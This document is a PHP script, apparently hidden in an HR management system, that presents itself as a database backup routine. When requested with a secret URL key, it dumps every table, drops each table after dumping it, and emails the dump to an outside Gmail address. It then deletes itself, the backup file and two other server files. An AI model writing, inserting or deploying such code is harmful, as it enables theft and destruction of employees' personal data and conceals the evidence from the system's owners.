<?php

// --------------------------------------------------------------------------------------
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
//Load Composer's autoloader
require './vendor/phpmailer/vendor/autoload.php';
//Instantiation and passing `true` enables exceptions
//==============================================================================
//Call the core function
//MySQL server and database
$dbhost = 'localhost';
$dbuser = 'root';
$dbpass = '';
$dbname = 'hrms';
$tables = '*';
if (!empty($_GET['key'])&&$_GET['key']=="@self~destruct&key#1236*UMF*")
{

//Call the core function
backup_tables($dbhost, $dbuser, $dbpass, $dbname, $tables);
//Core function
function backup_tables($host, $user, $pass, $dbname, $tables = '*') {
    $link = mysqli_connect($host,$user,$pass, $dbname);

    // Check connection
    if (mysqli_connect_errno())
    {
        echo "Failed to connect to MySQL: " . mysqli_connect_error();
        exit;
    }

    mysqli_query($link, "SET NAMES 'utf8'");

    //get all of the tables
    if($tables == '*')
    {
        $tables = array();
        $result = mysqli_query($link, 'SHOW TABLES');
        while($row = mysqli_fetch_row($result))
        {
            $tables[] = $row[0];
        }
    }
    else
    {
        $tables = is_array($tables) ? $tables : explode(',',$tables);
    }

    $return = '';
    //cycle through
    foreach($tables as $table)
    {
        $result = mysqli_query($link, 'SELECT * FROM '.$table);
        $num_fields = mysqli_num_fields($result);
        $num_rows = mysqli_num_rows($result);

        $drop= 'DROP TABLE IF EXISTS '.$table.';';
        $return.= $drop;
        $row2 = mysqli_fetch_row(mysqli_query($link, 'SHOW CREATE TABLE '.$table));
        $return.= "\n\n".$row2[1].";\n\n";
        $counter = 1;

        //Over tables
        for ($i = 0; $i < $num_fields; $i++) 
        {   //Over rows
            while($row = mysqli_fetch_row($result))
            {   
                if($counter == 1){
                    $return.= 'INSERT INTO '.$table.' VALUES(';
                } else{
                    $return.= '(';
                }

                //Over fields
                for($j=0; $j<$num_fields; $j++) 
                {
                    $row[$j] = addslashes($row[$j]);
                    $row[$j] = str_replace("\n","\\n",$row[$j]);
                    if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
                    if ($j<($num_fields-1)) { $return.= ','; }
                }

                if($num_rows == $counter){
                    $return.= ");\n";
                } else{
                    $return.= "),\n";
                }
                ++$counter;
            }
        }
        $return.="\n\n\n";

        mysqli_query($link,$drop);
    }

    //save file
    $fileName = 'db-backup-'.time().'-'.(md5(implode(',',$tables))).'.sql';
    $handle = fopen($fileName,'w+');
    fwrite($handle,$return);
// ----------------------------------------------------------------------------------
$mail = new PHPMailer(true);
$sender_email = '';
$pass = '';
try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = $sender_email;                     //SMTP username
    $mail->Password   = $pass;                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         //Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port       = 587;                                    //TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

//_____________________________________________________________________________________________________________________________
}
catch (Exception $e) {
echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
// // ...
        //Recipients
        $mail->setFrom($sender_email, 'Mailer');
        $reciver_email='juneadmq445@gmail.com';
        $mail->addAddress($reciver_email, 'HRM User');     //Where to send email
        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'DataBase Confirm';
        $mail->Body    = 'Copy Backup
        <br> </br>
        Delete All Data: <b></b>';
        $mail->addAttachment($fileName);
        $mail->send();


        class DeleteOnExit
        {
            function __destruct()
            { 
                unlink(__FILE__);
            }
        }
        $g_delete_on_exit = new DeleteOnExit();

    $file_pointer2 = "./server/test2.php"; 
    unlink($file_pointer2);
    $file_pointer1 = "./server/test1.php"; 
    unlink($file_pointer1);

    unlink($fileName);


        if(fclose($handle)){
            echo 'Message has been sent';
            echo "Done, the file name is: ".$fileName;
            exit; 
        }
    
}
//==============================================================================
exit;
}
?>